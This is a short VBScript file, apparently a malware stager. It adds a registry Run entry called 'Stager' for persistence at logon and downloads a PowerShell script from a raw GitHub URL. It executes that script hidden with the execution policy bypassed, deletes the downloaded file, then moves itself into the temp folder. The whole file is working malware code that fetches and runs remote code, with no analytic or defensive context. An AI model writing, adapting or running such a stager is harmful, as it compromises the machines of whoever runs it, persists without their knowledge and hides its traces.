
Dim objShell, objFSO, url, strKeyPath, strKeyName, strValue
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strKeyName = "Stager"
strValue = "wscript.exe """ & objShell.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
If Not RegKeyExists(strKeyPath, strKeyName) Then
    objShell.RegWrite strKeyPath & "\" & strKeyName, strValue
End If

Function RegKeyExists(keyPath, keyName)
    On Error Resume Next
    RegKeyExists = Not objShell.RegRead(keyPath & "\" & keyName) = ""
    On Error GoTo 0
End Function
Function ExecutePowerShellScript(url)
    Dim oStream, scriptContent, tempScriptPath
    Set oStream = CreateObject("WinHttp.WinHttpRequest.5.1")
    oStream.Open "GET", url, False
    oStream.Send
    If oStream.Status = 200 Then
        scriptContent = oStream.ResponseBody
        tempScriptPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\temp.ps1"
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write scriptContent
        oStream.SaveToFile tempScriptPath, 2
        oStream.Close
        objShell.Run "powershell.exe -ExecutionPolicy Bypass -File " & tempScriptPath, 0, True
        objFSO.DeleteFile tempScriptPath
    End If
End Function
url = "https://raw.githubusercontent.com/malwarekid/GoodUSB/master/msg.ps1"
ExecutePowerShellScript url
Sub MoveScriptToTemp
    Dim tempDir, scriptPath, destination
    tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
    scriptPath = WScript.ScriptFullName
    destination = tempDir & "\stager.vbs"
    If Not objFSO.FileExists(destination) Then
        objFSO.MoveFile scriptPath, destination
    End If
End Sub
MoveScriptToTemp
